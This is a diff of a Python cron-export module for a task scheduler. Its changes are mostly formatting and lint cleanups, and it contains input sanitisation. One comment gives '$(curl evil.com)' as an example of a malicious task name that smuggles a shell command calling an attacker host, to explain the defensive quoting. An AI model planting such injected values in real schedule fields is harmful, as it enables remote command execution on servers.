@@ -34,7 +34,6 @@ from collections.abc import Iterable
 
 from z4j_scheduler.exporters._client import ExportedSchedule
 
-
 _INTERVAL_TO_CRON: dict[str, str] = {
     # Common intervals → equivalent 5-field cron expression.
     "60s": "* * * * *",
@@ -102,7 +101,7 @@ def _is_safe_cron_expression(expression: str) -> bool:
     return all(_CRON_FIELD_CHARS.match(f) for f in fields)
 
 
-def _render_one(sched: ExportedSchedule) -> list[str]:
+def _render_one(sched: ExportedSchedule) -> list[str]:  # noqa: PLR0911  schedule-kind dispatch
     # Strip control chars from
     # ``task_name`` BEFORE ``shlex.quote``. ``shlex.quote`` wraps
     # the value in single quotes, which preserve newlines
@@ -115,7 +114,9 @@ def _render_one(sched: ExportedSchedule) -> list[str]:
     # ``pattern=_NO_CONTROL_CHARS`` validator also rejects this at
     # the API boundary (companion change in api/schedules.py).
     cleaned_task_name = re.sub(
-        r"[\r\n\x00]+", " ", sched.task_name,
+        r"[\r\n\x00]+",
+        " ",
+        sched.task_name,
     )[:200]
     # ``shlex.quote`` defends against an attacker who plants a
     # schedule with a malicious task_name like ``$(curl evil.com)``.
@@ -138,13 +139,15 @@ def _render_one(sched: ExportedSchedule) -> list[str]:
     # for interval / one_shot / refused-cron benefit from the
     # explicit cap).
     safe_expression = re.sub(
-        r"[\r\n\x00]+", " ", sched.expression,
+        r"[\r\n\x00]+",
+        " ",
+        sched.expression,
     )[:200]
 
     if not sched.is_enabled:
         return [
             f"# DISABLED in z4j: {safe_name} ({safe_task_name_comment}) -",
-            f"# uncomment to enable.",
+            "# uncomment to enable.",
             f"# 0 * * * * $WRAPPER {safe_task_name}",
             "",
         ]
@@ -163,8 +166,7 @@ def _render_one(sched: ExportedSchedule) -> list[str]:
             return [
                 f"# {safe_name}: REFUSED to render cron expression "
                 f"{safe_expression!r} - contains characters outside the",
-                f"# cron field vocabulary [0-9*/,-]. Edit the schedule "
-                f"in z4j and re-export.",
+                "# cron field vocabulary [0-9*/,-]. Edit the schedule in z4j and re-export.",
                 "",
             ]
         return [
@@ -178,7 +180,7 @@ def _render_one(sched: ExportedSchedule) -> list[str]:
         if cron_expr is None:
             return [
                 f"# {safe_name}: interval {safe_expression!r} cannot be",
-                f"# expressed in 5-field cron - keep z4j-scheduler for this row.",
+                "# expressed in 5-field cron - keep z4j-scheduler for this row.",
                 "",
             ]
         return [
@@ -190,7 +192,7 @@ def _render_one(sched: ExportedSchedule) -> list[str]:
     if sched.kind in ("clocked", "one_shot"):
         return [
             f"# {safe_name}: one_shot at {safe_expression!r} - system cron",
-            f"# has no native one-shot. Use ``at`` or run manually.",
+            "# has no native one-shot. Use ``at`` or run manually.",
             "",
         ]
 
